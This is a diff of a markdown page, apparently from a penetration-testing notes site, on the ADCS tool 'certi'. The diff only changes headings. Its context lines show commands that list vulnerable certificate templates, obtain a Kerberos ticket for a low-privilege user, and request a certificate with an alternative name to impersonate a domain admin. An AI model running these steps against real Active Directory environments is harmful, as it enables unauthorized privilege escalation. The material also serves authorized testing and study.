@@ -13,7 +13,7 @@ tags : ['Other', 'Active Directory', 'ADCS']
 
 Utility to play with ADCS, allows to request tickets and collect information about related objects. Basically, it's the impacket copy of [Certify](https://github.com/GhostPack/Certify). Thanks to [@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) for [its great work with ADCS](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf).
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/zer1t0/certi
@@ -23,7 +23,7 @@ python3 setup.py install
 
 ### List
 
-#### Usage list
+### Usage list
 
 ```plain
 certi.py list [-h] [--dc-ip IP] [-k] [-n] [--class [{template,ca,service,ntauth} ...]] [--aes hex key] [--enabled] [--vuln] [--temp-name TEMP_NAME [TEMP_NAME ...]] [--temp-filter TEMP_FILTER]
@@ -31,7 +31,7 @@ certi.py list [-h] [--dc-ip IP] [-k] [-n] [--class [{template,ca,service,ntauth}
                      target
 ```
 
-#### Flags list
+### Flags list
 
 ```plain
 positional arguments:
@@ -58,7 +58,7 @@ options:
 
 ### Req
 
-#### Req usage
+### Req usage
 
 ```plain
 usage: certi.py req [-h] [--dc-ip IP] [-t TEMPLATE] [--hashes LMHASH:NTHASH] [--aes hex key] [-k] [-n] [-P CERT_PASS] [-a ALT_NAME] [-o filename] [--on-behalf name] [--enroll-cert ENROLL_CERT]
@@ -66,7 +66,7 @@ usage: certi.py req [-h] [--dc-ip IP] [-t TEMPLATE] [--hashes LMHASH:NTHASH] [--
                     target service
 ```
 
-#### Req flags
+### Req flags
 
 ```plain
 positional arguments:
@@ -98,9 +98,9 @@ options:
   -2, --version2        Use WCCE version 2
 ```
 
-### Examples
+## Examples
 
-#### Listing vulnerable templates
+### Listing vulnerable templates
 
 ```plain
 $ certi.py list 'offsec.nl/johndo-lowpriv' --dc-ip DC01PKI.offsec.nl --vuln --enable
@@ -161,7 +161,7 @@ Permissions
       S-1-5-21-497837788-612300594-3587273769-513 offsec\Domain Users
 ```
 
-#### Requesting ticket for low-priv user
+### Requesting ticket for low-priv user
 
 ```plain
 getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234'
@@ -173,7 +173,7 @@ Making the ticket available:
 export KRB5CCNAME=johndo-lowpriv.ccache
 ```
 
-#### Requesting certificate with alternative name
+### Requesting certificate with alternative name
 
 ```plain
 python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
@@ -195,6 +195,6 @@ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI
 
 For further steps on how to abuse AD CS, checkout [Abuse AD CS]({{< ref "abuse-adcs" >}})
 
-### URL list
+## URL List
 
 * [Github.com - Certi](https://github.com/zer1t0/certi)
